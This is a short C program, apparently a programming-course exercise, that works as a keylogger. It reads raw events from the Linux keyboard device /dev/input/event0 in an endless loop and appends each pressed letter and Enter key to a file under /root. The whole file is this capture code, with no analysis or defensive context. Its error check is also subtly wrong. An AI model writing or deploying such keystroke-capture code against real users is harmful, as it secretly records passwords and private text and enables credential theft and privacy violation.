#include<stdio.h>
#include<sys/types.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<time.h>
#include<string.h>
#include<linux/input.h>

int main()
{
	int fd,fd1;
	char *archivo="/dev/input/event0";
	char *ar_salida = "/root/cursoC/practica20/salida";
	struct input_event ev;
	fd1 = open(ar_salida,O_WRONLY|O_CREAT|O_APPEND,S_IRUSR);
	fd=open(archivo,O_RDONLY);
	if(fd==-1 && fd1 == -1)
		printf("No se pudo abrir el archivo");
	printf("Descriptor: %d",fd);
	while(1)
	{

		read(fd,&ev,sizeof(struct input_event));
		if(ev.value == 1)
		{
			//printf("%i\n",ev.code);
		switch(ev.code){
			case 0x001e: //printf("a\n");
				write(fd1,"a\n",1);
				break;
        		case 0x0030: //printf("b\n"); 
				write(fd1,"b\n",1);
				break;
        		case 0x002e: //printf("c\n"); 
				write(fd1,"c\n",1);
				break;
		        case 0x0020: //printf("d\n"); 
				write(fd1,"d\n",1);				
				break;
		        case 0x0012: //printf("e\n"); 
				write(fd1,"e\n",1);
				break;
		        case 0x0021: //printf("f\n"); 
				write(fd1,"f\n",1);
				break;
		        case 0x0022: //printf("g\n");
			 	write(fd1,"g\n",1);
				break;
		        case 0x0023: //printf("h\n"); 
				write(fd1,"h\n",1);
				break;
		        case 0x0017: //printf("i\n"); 			
				write(fd1,"i\n",1);
				break;
		        case 0x0024: //printf("j\n"); 
				write(fd1,"j\n",1);
				break;
		        case 0x0025: //printf("k\n"); 
				write(fd1,"k\n",1);
				break;
		        case 0x0026: //printf("l\n"); 
				write(fd1,"l\n",1);
				break;
		        case 0x0032: //printf("m\n"); 
				write(fd1,"m\n",1);
				break;
		        case 0x0031: //printf("n\n"); 
				write(fd1,"n\n",1);
				break;
		        case 0x0018: //printf("o\n"); 
				write(fd1,"o\n",1);
				break;
		        case 0x0019: //printf("p\n"); 
				write(fd1,"p\n",1);
				break;
		        case 0x0010: //printf("q\n"); 
				write(fd1,"q\n",1);
				break;
		        case 0x0013: //printf("r\n"); 
				write(fd1,"r\n",1);
				break;
		        case 0x001f: //printf("s\n"); 
				write(fd1,"s\n",1);
				break;
		        case 0x0014: //printf("t\n");
				write(fd1,"t\n",1);
				break;
		        case 0x0016: //printf("u\n"); 
				write(fd1,"u\n",1);
				break;
		        case 0x002f: //printf("v\n"); 
				write(fd1,"v\n",1);
				break;
		        case 0x0011: //printf("w\n"); 
				write(fd1,"w\n",1);
				break;
		        case 0x002d: //printf("x\n"); 
				write(fd1,"x\n",1);
				break;
		        case 0x0015: //printf("y\n"); 
				write(fd1,"y\n",1);
				break;
		        case 0x002c: //printf("z\n"); 
				write(fd1,"z\n",1);
				break;
			case 0x001c: //printf("\n"); 
				write(fd1,"\n",1);
				break;
			
			default: //printf("No definido"); 
				write(fd1,"  \n",1);
				break;
			}
		
		}
	}
	close(fd);
	close(fd1);
	return 0;
}
